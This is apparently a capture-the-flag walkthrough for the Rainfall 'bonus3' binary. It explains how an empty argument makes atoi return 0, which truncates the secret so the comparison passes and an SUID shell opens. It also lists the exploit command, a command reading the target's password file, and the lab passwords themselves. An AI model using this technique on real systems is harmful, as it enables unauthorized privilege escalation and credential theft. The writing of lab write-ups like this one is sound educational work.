# level13

## 1. Connect to the VM

This level corresponds to the Rainfall `bonus3` binary.

The password for `bonus3`, obtained by solving `bonus2`, is:

```text
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

Connect with:

```bash
ssh bonus3@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `end` and has the SUID bit set. It therefore runs with
`end` privileges.

The program opens the final password file:

```c
file = fopen("/home/user/end/.pass", "r");
```

It then reads the first 66 bytes into `pass`:

```c
fread(pass, 1, 66, file);
```

The command-line argument is converted with `atoi`, and the result is used as
an index in `pass`:

```c
index = atoi(argv[1]);
pass[index] = '\0';
```

Finally, the program compares the modified password with the argument. If both
strings are equal, it opens a shell:

```c
if (strcmp(pass, argv[1]) == 0)
    execl("/bin/sh", "sh", NULL);
```

The objective is to make `pass` become the same string as `argv[1]`, without
knowing the real content of `/home/user/end/.pass`.

## 3. Understand the empty-string trick

`atoi` returns `0` when the input is not a valid number:

```text
atoi("") = 0
```

If we pass an empty string as the only argument, the program writes a null byte
at the beginning of `pass`:

```c
pass[0] = '\0';
```

This transforms `pass` into an empty C string. Since `argv[1]` is also an
empty string, the comparison succeeds:

```text
strcmp("", "") = 0
```

No overflow or shellcode is required for this level. The bug is the unsafe use
of an attacker-controlled `atoi` result to truncate the secret before comparing
it.

## 4. Exploit the binary

Run:

```bash
./bonus3 ""
```

The modified `pass` is now equal to the empty argument, so the program executes
`/bin/sh` with `end` privileges.

Then read the final password:

```bash
cat /home/user/end/.pass
```

The output contains:

```text
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

This is the password stored in `flag`.
